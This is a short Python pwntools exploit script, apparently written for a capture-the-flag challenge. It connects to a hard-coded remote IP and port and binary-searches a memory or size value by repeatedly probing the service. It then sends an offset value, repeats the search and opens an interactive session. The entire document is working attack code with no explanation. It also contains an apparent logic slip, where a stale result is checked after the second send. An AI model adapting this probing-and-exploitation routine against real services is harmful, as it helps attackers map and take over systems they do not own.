from pwn import *

context.log_level='debug'

def main():
    r = remote('54.202.7.144', 6969)
    #r = remote('localhost', 8080)

    lo = 0
    hi = 0x500000000000 #1 << 64
    while True:
        if lo > hi:
            break

        r.recvuntil(' : ')
        r.send("a\n")
        r.recvuntil(' ')

        m = (hi + lo) / 2

        print("lo: %16X, hi: %16X, m: %16X" % (lo, hi, m))
        r.send("%d\n" % m)
        o = r.read(4)
        if o == "free":
            r.recvuntil(" ")
            r.send("y\n")
            lo = m + 1
        else:
            hi = m - 1

    r.recvuntil(' : ')
    r.send("a\n")
    r.recvuntil(' ')
    r.send("%d\n" % (m-0x1000))
    r.read(4)
    if o == "free":
        r.recvuntil(" ")
        r.send("n\n")
    else:
        raise

    lo = 0
    hi = 1 << 64
    while True:
        if lo > hi:
            break

        r.recvuntil(' : ')
        r.send("a\n")
        r.recvuntil(' ')

        m = (hi + lo) / 2

        print("lo: %16X, hi: %16X, m: %16X" % (lo, hi, m))
        r.send("%d\n" % m)
        o = r.read(4)
        if o == "free":
            r.recvuntil(" ")
            r.send("y\n")
            lo = m + 1
        else:
            hi = m - 1

    r.interactive()

if __name__ == "__main__":
    main()
